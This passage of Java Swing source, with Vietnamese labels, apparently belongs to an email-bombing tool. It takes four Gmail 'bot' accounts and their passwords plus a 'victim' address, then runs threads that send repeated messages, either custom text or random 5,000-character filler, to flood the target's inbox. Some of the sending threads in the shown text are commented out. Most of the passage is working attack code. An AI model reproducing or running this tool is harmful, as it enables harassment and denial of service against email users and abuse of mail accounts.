                                    System.out.println("Done");

                                } catch (MessagingException e) {


                                        throw new RuntimeException(e);
                                }
                            }  
                        }
                    });
                    t9.start();

                    Thread t10 = new Thread(new Runnable() {
                        @Override
                        public void run() {
                              for (int i = 0; i < 10; i++) {
                                try {
                                    Message message = new MimeMessage(session);
                                    message.setFrom(new InternetAddress(email.getEmail()));
                                    message.setRecipients(Message.RecipientType.TO,
                                            InternetAddress.parse(target));
                                    if (rboRandom.isSelected()) {
                                        String title = randomString();
                                        String context = randomContext();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    else{
                                        String title = txtTieuDe.getText();
                                        String context = txtNoiDung.getText();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    Transport.send(message);

                                    System.out.println("Done");

                                } catch (MessagingException e) {


                                        throw new RuntimeException(e);
                                }
                            }  
                        }
                    });
                    t10.start();
                    */
                }        
            }

        } catch (NumberFormatException e) {
            JOptionPane.showMessageDialog(rootPane, "Số packet phải là số");
        }
        
    }//GEN-LAST:event_btnSendActionPerformed

    private void formWindowOpened(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowOpened
        panelEmailVictim.setVisible(false);
        result.setVisible(false);
    }//GEN-LAST:event_formWindowOpened

    private void rboRandomActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_rboRandomActionPerformed
        txtNoiDung.setEditable(false);
        txtTieuDe.setEditable(false);
        txtNoiDung.setText(randomContext());
        txtTieuDe.setText(randomString());
        
    }//GEN-LAST:event_rboRandomActionPerformed

    private void btnSaveBotActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSaveBotActionPerformed
        if (txtBot1.getText().length()==0 || txtBot2.getText().length()==0
            ||txtBot3.getText().length()==0 || txtBot4.getText().length()==0
            ||txtPass1.getText().length()==0 || txtPass2.getText().length()==0
            ||txtPass3.getText().length()==0 || txtPass4.getText().length()==0)
        {
            JLabel label = new JLabel("Không được bỏ trống");
            label.setFont(new Font("Arial", Font.BOLD, 18));
            JOptionPane.showMessageDialog(this,label,"Lỗi nhập liệu",JOptionPane.WARNING_MESSAGE);
        }
        else if(isGmailAddress(txtBot1.getText())==false || isGmailAddress(txtBot2.getText())==false
            || isGmailAddress(txtBot3.getText())==false || isGmailAddress(txtBot4.getText())==false){
            JLabel label = new JLabel("Lỗi email");
            label.setFont(new Font("Arial", Font.BOLD, 18));
            JOptionPane.showMessageDialog(this,label,"Lỗi email",JOptionPane.WARNING_MESSAGE);
        }
        else{
            panelEmailVictim.setVisible(true);

        }
    }//GEN-LAST:event_btnSaveBotActionPerformed

    private void txtPass4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_txtPass4ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_txtPass4ActionPerformed

    private void txtBot1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_txtBot1ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_txtBot1ActionPerformed
    public static boolean isGmailAddress(String emailAddress) {
        String expression = "^[\\w.+\\-]+@gmail\\.com$";
        CharSequence inputStr = emailAddress;
        Pattern pattern = Pattern.compile(expression, Pattern.CASE_INSENSITIVE);
        Matcher matcher = pattern.matcher(inputStr);
        return matcher.matches();
    }
    private static String randomString(){
        char[] chars = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        StringBuilder sb = new StringBuilder(20);
        Random random = new Random();
        for (int i = 0; i < 20; i++) {
            char c = chars[random.nextInt(chars.length)];
            sb.append(c);
        }
        return sb.toString();
    }
    
    private static String randomContext(){
        char[] chars = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        StringBuilder sb = new StringBuilder(5000);
        Random random = new Random();
        for (int i = 0; i < 5000; i++) {
            char c = chars[random.nextInt(chars.length)];
            sb.append(c);
        }
        return sb.toString();
    }
    
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new main().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private java.awt.Button btnSaveBot;
    private javax.swing.JButton btnSend;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JLabel lbEmail2;
    private javax.swing.JLabel lbEmail3;
    private javax.swing.JLabel lbEmail4;
    private javax.swing.JLabel lbPass2;
    private javax.swing.JLabel lbPass3;
    private javax.swing.JLabel lbPass4;
    private javax.swing.JPanel panelBot;
    private javax.swing.JPanel panelEmailVictim;
    private javax.swing.JRadioButton rboRandom;
    private javax.swing.JPanel result;
    private javax.swing.JTextField txtBot1;
    private javax.swing.JTextField txtBot2;
    private javax.swing.JTextField txtBot3;
    private javax.swing.JTextField txtBot4;
    private javax.swing.JTextField txtEmail;
    private javax.swing.JTextArea txtKetqua;
    private java.awt.TextArea txtNoiDung;
    private javax.swing.JTextField txtPass1;
    private javax.swing.JTextField txtPass2;
    private javax.swing.JTextField txtPass3;
    private javax.swing.JTextField txtPass4;
    private javax.swing.JTextField txtSoLan;
    private javax.swing.JTextField txtTieuDe;
    // End of variables declaration//GEN-END:variables
}
